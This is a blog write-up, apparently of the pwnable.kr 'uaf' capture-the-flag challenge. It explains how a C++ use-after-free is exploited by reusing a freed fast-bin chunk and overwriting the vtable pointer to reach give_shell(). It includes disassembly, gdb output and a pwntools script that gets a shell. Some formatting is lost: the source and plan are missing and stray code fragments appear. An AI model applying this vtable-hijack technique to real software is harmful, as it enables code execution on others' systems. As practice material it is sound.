---
layout: post
title: "Pwnable.kr writeup — uaf"
date: 2017-10-19 23:20:14 +0000
categories: blog
---

### Pwnable.kr writeup — uaf

This is a well-designed and simple challenge to practice pwnable exploits. Its name already tells you what to exploit: use-after-free. But how?

Read the source code first, to understand what it does:

As the name tells, the exploit is use after free, so here is our plan:

In order to make this work, we need to connect them together of course. The key is step 2, in order to connect it with step 1 and step 3, we need to make sure:

```
->introduce()
```

```
->give_shell()
```

How can we ensure we could allocate the last memory chunk we just freed? If you’ve read my post about heap overflow exploits, you know that fast-bin chunks are in LIFO order, so all we need to do is making sure they fit in fast bins and have exactly the same size.

Looking into the assembly code near operator new:

```
operator new
```

```
400f55: 4c 8d 65 c0           lea    -0x40(%rbp),%r12  400f59: bf 18 00 00 00        mov    $0x18,%edi  400f5e: e8 2d fe ff ff        callq  400d90 <operator new(unsigned long)@plt>
```

It is quite easy to figure out the chunk size is 0x18, 24 bytes. So it clearly fits in a fast bin and this must be the first cmdline argument we pass.

Hijacking the virtual function pointer is much harder, we have to take a deep look at the assembly code to understand how virtual functions work in C++. Let’s locate the assembly code calling that virtual function:

```
400fcd: 48 8b 45 c8           mov    -0x38(%rbp),%rax400fd1: 48 8b 00              mov    (%rax),%rax400fd4: 48 83 c0 08           add    $0x8,%rax400fd8: 48 8b 10              mov    (%rax),%rdx400fdb: 48 8b 45 c8           mov    -0x38(%rbp),%rax400fdf: 48 89 c7              mov    %rax,%rdi400fe2: ff d2                 callq  *%rdx400fe4: 48 8b 45 d0           mov    -0x30(%rbp),%rax400fe8: 48 8b 00              mov    (%rax),%rax400feb: 48 83 c0 08           add    $0x8,%rax400fef: 48 8b 10              mov    (%rax),%rdx400ff2: 48 8b 45 d0           mov    -0x30(%rbp),%rax400ff6: 48 89 c7              mov    %rax,%rdi400ff9: ff d2                 callq  *%rdx
```

We know C++ virtual functions are stored in a virtual function table and from the above code we can see:

```
->introduce()
```

```
->introduce()
```

```
this
```

If we translate the above in to pseudo C, it is something like: this->vptr->introduce() , where vptr is at offset 0 and introduce() is at offset 8.

```
this->vptr->introduce()
```

```
vptr
```

```
introduce()
```

Let’s attach gdb and see where and what is vptr:

```
vptr
```

```
(gdb) b *0x0000000000400fd4Breakpoint 1 at 0x400fd4(gdb) rStarting program: /home/uaf/uaf1. use2. after3. free1
```

```
Breakpoint 1, 0x0000000000400fd4 in main ()(gdb) p $rax$1 = 4199792(gdb) x/2gx $rax0x401570 <_ZTV3Man+16>: 0x000000000040117a 0x00000000004012d2(gdb) x/5i 0x000000000040117a   0x40117a <_ZN5Human10give_shellEv>: push   %rbp   0x40117b <_ZN5Human10give_shellEv+1>: mov    %rsp,%rbp   0x40117e <_ZN5Human10give_shellEv+4>: sub    $0x10,%rsp   0x401182 <_ZN5Human10give_shellEv+8>: mov    %rdi,-0x8(%rbp)   0x401186 <_ZN5Human10give_shellEv+12>: mov    $0x4014a8,%edi(gdb) x/5i 0x00000000004012d2   0x4012d2 <_ZN3Man9introduceEv>: push   %rbp   0x4012d3 <_ZN3Man9introduceEv+1>: mov    %rsp,%rbp   0x4012d6 <_ZN3Man9introduceEv+4>: sub    $0x10,%rsp   0x4012da <_ZN3Man9introduceEv+8>: mov    %rdi,-0x8(%rbp)   0x4012de <_ZN3Man9introduceEv+12>: mov    -0x8(%rbp),%rax
```

Ah, it is clear that vptr is located at 0x401570 and it contains two function pointers: ->give_shell() and ->introduce()! And vptr is contained in each of these classes too, as the first member. This means we need to fill it into the memory chunk! But how does hijack happen? If we fill 0x401570, we still get ->introduce() called. We know ->introduce() is at offset 8, this is in binary is not what we can control, but… we can fill 0x401570–8 = 0x401568 !!

```
vptr
```

```
0x401570
```

```
->give_shell()
```

```
->introduce()
```

```
0x401570
```

```
->introduce()
```

```
->introduce()
```

The last thing to note is since fast bin memory chunks are reused in LIFO order, our first allocation should get w, the second one get m . This means we have to make two allocations and fill both of them, otherwise m->introduce() will segfault…

```
w
```

```
m
```

```
m->introduce()
```

So the final code is:

```
from pwn import *
```

```
s = ssh(host='pwnable.kr', port=2222,        user='uaf',        password='guest')context.log_level = 'debug'a = s.process(["./uaf", "24", "/dev/stdin"])a.recv(1024)a.sendline("3")a.recv(1024)a.sendline("2")a.send("\x68\x15\x40\x00\x00\x00\x00\x00")a.recvuntil('free\n')a.sendline("2")a.send("\x68\x15\x40\x00\x00\x00\x00\x00")a.recvuntil('free\n')a.sendline("1")a.interactive()
```